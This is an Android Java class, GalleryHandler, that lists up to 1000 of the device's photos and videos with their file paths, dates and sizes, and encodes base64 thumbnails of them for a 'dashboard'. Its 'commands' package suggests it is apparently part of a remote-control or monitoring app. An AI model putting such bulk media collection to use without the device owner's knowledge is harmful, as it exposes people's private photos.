package com.task.tusker.commands;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ThumbnailUtils;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

/**
 * Gallery Handler — queries MediaStore for all device images + videos,
 * returns metadata with small embedded thumbnails for the dashboard gallery tab.
 */
public class GalleryHandler {
    private static final String TAG = "GalleryHandler";
    private final Context context;

    public GalleryHandler(Context context) {
        this.context = context;
    }

    /**
     * Get gallery metadata with small thumbnails.
     * @param type  "all", "image", or "video"
     * @param limit max items (0 = no limit, capped at 1000)
     */
    public JSONArray getGallery(String type, int limit) {
        JSONArray result = new JSONArray();
        int cap = (limit <= 0 || limit > 1000) ? 1000 : limit;
        try {
            boolean includeImages = !"video".equals(type);
            boolean includeVideos = !"image".equals(type);

            if (includeImages) {
                int imgLimit = includeVideos ? cap / 2 : cap;
                if (imgLimit <= 0) imgLimit = cap;
                queryMedia(result, false, imgLimit);
            }
            if (includeVideos) {
                int vidLimit = includeImages ? (cap - result.length()) : cap;
                if (vidLimit > 0) queryMedia(result, true, vidLimit);
            }
        } catch (Exception e) {
            Log.e(TAG, "getGallery error: " + e.getMessage());
        }
        return result;
    }

    private void queryMedia(JSONArray result, boolean isVideo, int limit) {
        Uri collection = isVideo
                ? MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] baseProjection = {
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.MIME_TYPE,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.DATE_TAKEN,
                MediaStore.MediaColumns.WIDTH,
                MediaStore.MediaColumns.HEIGHT,
        };

        String[] projection;
        if (isVideo) {
            projection = new String[]{
                    MediaStore.MediaColumns._ID,
                    MediaStore.MediaColumns.DATA,
                    MediaStore.MediaColumns.DISPLAY_NAME,
                    MediaStore.MediaColumns.MIME_TYPE,
                    MediaStore.MediaColumns.SIZE,
                    MediaStore.MediaColumns.DATE_TAKEN,
                    MediaStore.MediaColumns.WIDTH,
                    MediaStore.MediaColumns.HEIGHT,
                    MediaStore.Video.VideoColumns.DURATION,
            };
        } else {
            projection = baseProjection;
        }

        String sortOrder = MediaStore.MediaColumns.DATE_TAKEN + " DESC LIMIT " + limit;
        ContentResolver cr = context.getContentResolver();

        try (Cursor cursor = cr.query(collection, projection, null, null, sortOrder)) {
            if (cursor == null) return;
            while (cursor.moveToNext()) {
                try {
                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
                    String mime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE));
                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
                    long dateTaken = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_TAKEN));
                    int width = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.WIDTH));
                    int height = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.HEIGHT));
                    long duration = 0;
                    if (isVideo) {
                        int durIdx = cursor.getColumnIndex(MediaStore.Video.VideoColumns.DURATION);
                        if (durIdx >= 0) duration = cursor.getLong(durIdx);
                    }

                    String thumb = getThumbnailBase64(id, path != null ? path : "", isVideo, 120);

                    JSONObject item = new JSONObject();
                    item.put("id", id);
                    item.put("path", path != null ? path : "");
                    item.put("name", name != null ? name : "");
                    item.put("type", isVideo ? "video" : "image");
                    item.put("mimeType", mime != null ? mime : "");
                    item.put("size", size);
                    item.put("dateTaken", dateTaken);
                    item.put("width", width);
                    item.put("height", height);
                    if (isVideo) item.put("duration", duration);
                    if (thumb != null) item.put("thumbnail", thumb);

                    result.put(item);
                } catch (Exception e) {
                    Log.w(TAG, "Row error: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "queryMedia error: " + e.getMessage());
        }
    }

    /**
     * Get a base64 JPEG thumbnail for a single media item.
     * Used both for small grid thumbnails and larger lightbox previews.
     */
    public String getThumbnailBase64(long mediaId, String path, boolean isVideo, int size) {
        try {
            Bitmap bmp = null;

            // Android 10+ — use ContentResolver.loadThumbnail (no file access needed)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && mediaId > 0) {
                try {
                    Uri uri = isVideo
                            ? Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, String.valueOf(mediaId))
                            : Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(mediaId));
                    bmp = context.getContentResolver()
                            .loadThumbnail(uri, new Size(size, size), null);
                } catch (Exception ignored) {}
            }

            // Fallback: direct file decode
            if (bmp == null && path != null && !path.isEmpty()) {
                if (isVideo) {
                    try {
                        bmp = ThumbnailUtils.createVideoThumbnail(path,
                                size <= 150 ? MediaStore.Images.Thumbnails.MICRO_KIND
                                            : MediaStore.Images.Thumbnails.MINI_KIND);
                    } catch (Exception ignored) {}
                }

                if (bmp == null) {
                    try {
                        BitmapFactory.Options opts = new BitmapFactory.Options();
                        opts.inJustDecodeBounds = true;
                        BitmapFactory.decodeFile(path, opts);
                        if (opts.outWidth > 0) {
                            int inSample = 1;
                            while ((opts.outWidth / inSample) > size * 2
                                    || (opts.outHeight / inSample) > size * 2) {
                                inSample *= 2;
                            }
                            opts.inJustDecodeBounds = false;
                            opts.inSampleSize = inSample;
                            opts.inPreferredConfig = Bitmap.Config.RGB_565;
                            Bitmap raw = BitmapFactory.decodeFile(path, opts);
                            if (raw != null) {
                                bmp = ThumbnailUtils.extractThumbnail(raw, size, size);
                                if (bmp != raw) raw.recycle();
                            }
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "File decode error: " + e.getMessage());
                    }
                }
            }

            if (bmp == null) return null;

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bmp.compress(Bitmap.CompressFormat.JPEG, 72, baos);
            bmp.recycle();
            return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);

        } catch (Exception e) {
            Log.e(TAG, "getThumbnailBase64 error: " + e.getMessage());
            return null;
        }
    }
}
